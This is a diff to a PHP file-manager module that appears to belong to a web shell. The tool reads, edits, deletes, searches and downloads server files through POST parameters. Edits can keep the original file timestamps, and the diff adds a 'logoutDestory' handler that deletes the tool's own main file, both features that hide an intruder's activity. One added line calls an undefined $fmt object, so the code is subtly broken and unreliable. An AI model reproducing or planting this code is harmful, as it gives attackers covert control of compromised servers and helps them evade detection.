@@ -6,13 +6,14 @@ chdir(get_cwd());
 $nav = get_nav(get_cwd());
 $p = array_map("rawurldecode", get_post());
 $cwd = html_safe(get_cwd());
+$fmc = new FileManagerClass();
 $GLOBALS['module'] = array();
 
 $explorer_content = "";
 if (isset($p['viewEntry'])) {
 	$path = trim($p['viewEntry']);
 	if (is_file($path)) {
-		$dirname = realpath(FileManagerClass::get_parent_path($path)) . DIRECTORY_SEPARATOR;
+		$dirname = realpath($fmc->get_parent_path($path)) . DIRECTORY_SEPARATOR;
 		set_cookie("cwd", $dirname);
 		chdir($dirname);
 		$nav = get_nav($dirname);
@@ -152,26 +153,7 @@ if (isset($p['cd'])) {
 	output($res);
 } elseif (isset($p['delete'])) {
 	$path = trim($p['delete']);
-	$dirname = FileManagerClass::get_parent_path($path);
-	if (is_file($path)) {
-		if (unlink($path)) {
-			$res = $dirname;
-		}
-
-	} elseif (is_dir($path)) {
-		if (rmdirs($path) > 0) {
-			$res = $dirname;
-		}
-
-	} else {
-		$res = "error";
-	}
-
-	if (file_exists($path)) {
-		$res = "error";
-	}
-
-	output($res);
+	output(FileManagerClass::delete($path));
 } elseif (isset($p['editType']) && isset($p['editFilename']) && isset($p['editInput']) && isset($p['preserveTimestamp'])) {
 	$editFilename = trim($p['editFilename']);
 	$editInput = trim($p['editInput']);
@@ -182,7 +164,7 @@ if (isset($p['cd'])) {
 		$editInput = pack("H*", preg_replace("/\s/", "", $editInput));
 	}
 
-	if (write_file($editFilename, $editInput)) {
+	if ($fmc->put($editFilename, $editInput)) {
 		$res = $editFilename;
 		if ($preserveTimestamp == 'true') {
 			touch($editFilename, $time);
@@ -239,7 +221,7 @@ if (isset($p['cd'])) {
 		}
 		if ($findType == "file") {
 			if (!empty($findContent)) {
-				$content = read_file($k);
+				$content = $fmc->get($k);
 				if ($findContentRegex == "true") {
 					$case = ($findContentInsensitive == "true") ? "i" : "";
 					if (!preg_match("/" . $findContent . "/" . $case, $content)) {
@@ -382,7 +364,7 @@ if (isset($p['cd'])) {
 		header("Content-Type: " . $mime);
 		header('Content-Transfer-Encoding: binary');
 		header("Content-length: " . filesize($file));
-		echo "data:" . $mime . ";base64," . base64_encode(read_file($file));
+		echo "data:" . $mime . ";base64," . base64_encode($fmt->read_file($file));
 		die();
 	}
 } elseif (isset($p['massType']) && isset($p['massBuffer']) && isset($p['massPath']) && isset($p['massValue'])) {
@@ -498,5 +480,7 @@ if (isset($p['cd'])) {
 	output($res);
 } elseif (isset($p['converString'])) {
 	output(convert_string_to_utf8($p['converString']), 'utf-8');
+} elseif (isset($p['logoutDestory'])) {
+	output($fmc->delete($GLOBALS['config']['main_file']));
 }
 ?>
